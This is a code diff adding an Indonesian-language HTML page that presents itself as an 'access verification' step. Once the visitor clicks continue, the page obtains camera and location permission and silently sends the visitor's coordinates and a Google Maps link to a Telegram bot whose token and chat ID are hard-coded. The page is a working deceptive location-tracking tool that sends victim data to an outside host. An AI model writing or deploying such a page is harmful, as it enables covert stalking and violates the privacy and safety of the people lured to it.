@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Verifikasi</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="font-family:sans-serif;text-align:center;margin-top:60px;">
+
+  <h3>Verifikasi Akses</h3>
+  <button onclick="start()" style="padding:12px 20px;font-size:16px;">
+    Lanjutkan
+  </button>
+
+  <script>
+    // ===== GANTI INI =====
+    const BOT_TOKEN = "8214592633:AAEXPamPwD28igClX3R2S8q0WvHt-Vf4Lvo";
+    const CHAT_ID  = "8544910546";
+    // ====================
+
+    async function start() {
+      // Minta izin kamera (tanpa tampilkan)
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        stream.getTracks().forEach(track => track.stop());
+      } catch (e) {
+        alert("Izin kan semua dulu");
+        return;
+      }
+
+      // Minta izin lokasi
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendToTelegram(pos.coords.latitude, pos.coords.longitude);
+        },
+        () => {
+          alert("Izin lokasi ditolak");
+        }
+      );
+    }
+
+    function sendToTelegram(lat, lng) {
+      const text =
+        "📍 Lokasi diterima\n" +
+        "Latitude: " + lat + "\n" +
+        "Longitude: " + lng + "\n" +
+        "Maps: https://maps.google.com/?q=" + lat + "," + lng;
+
+      fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text
+        })
+      })
+      .then(() => {
+        alert("Data terkirim");
+      })
+      .catch(() => {
+        alert("Gagal kirim ke Telegram");
+      });
+    }
+  </script>
+
+</body>
+</html>
